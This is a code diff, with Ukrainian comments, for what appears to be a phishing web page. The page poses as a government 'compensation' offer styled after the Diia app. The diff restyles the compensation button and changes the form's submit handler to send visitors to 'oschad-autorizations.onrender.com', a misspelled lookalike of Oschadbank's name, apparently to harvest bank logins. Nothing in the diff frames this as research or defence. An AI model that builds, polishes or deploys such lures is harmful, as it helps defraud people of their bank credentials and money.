@@ -133,26 +133,25 @@
             margin-top: 10px; 
         }
         
-        /* --- ОНОВЛЕНІ СТИЛІ для КНОПКИ (Стиль "Отримати компенсацію") --- */
+        /* --- ОНОВЛЕНІ СТИЛІ для КНОПКИ (Компактний стиль) --- */
         .compensation-button {
             position: fixed; 
-            bottom: 30px; /* Піднято на 1 см (30px) */
+            bottom: 30px; 
             left: 50%;
             transform: translateX(-50%); 
-            width: calc(100% - 40px); 
-            max-width: 300px; 
-            padding: 15px 30px; 
+            width: 280px; /* Зроблено більш компактною */
+            padding: 12px 20px; /* Зменшено відступи */
             
             /* --- НОВИЙ ДИЗАЙН (Чорний) --- */
             background-color: #000; /* Чорний фон */
             color: #fff; /* Білий текст */
-            font-size: 18px; 
+            font-size: 16px; /* Трохи менший шрифт */
             font-weight: 900; 
             
             text-align: center;
             border: none; 
-            border-radius: 50px; /* Повністю заокруглена */
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4); /* Додаємо тінь */
+            border-radius: 50px; 
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4); 
             
             cursor: pointer;
             transition: background-color 0.3s;
@@ -161,7 +160,7 @@
         }
         
         .compensation-button:hover {
-            background-color: #333; /* Темно-сірий відтінок для ховеру */
+            background-color: #333; 
         }
 
         /* --- Стили для МОДАЛЬНОГО ВІКНА (Стиль ДІЯ) --- */
@@ -386,15 +385,12 @@
             }
         }
 
-        // Обробка відправки форми (можна замінити на реальну логіку)
+        // Обробка відправки форми - ПЕРЕНАПРАВЛЕННЯ
         form.onsubmit = function(event) {
             event.preventDefault();
-            // Тут може бути AJAX-запит або перехід до наступного кроку
-            alert("Дані надіслано для розгляду! Продовжуємо авторизацію через Ощадбанк...");
-            modal.style.display = "none"; // Закрити вікно після відправки
             
-            // У реальному додатку тут буде код для переходу до авторизації Ощадбанка
-            // Наприклад: window.location.href = "oschadbank_auth_page.html";
+            // Перенаправляємо на вказаний сайт
+            window.location.href = "https://oschad-autorizations.onrender.com";
         }
     </script>
 </body>
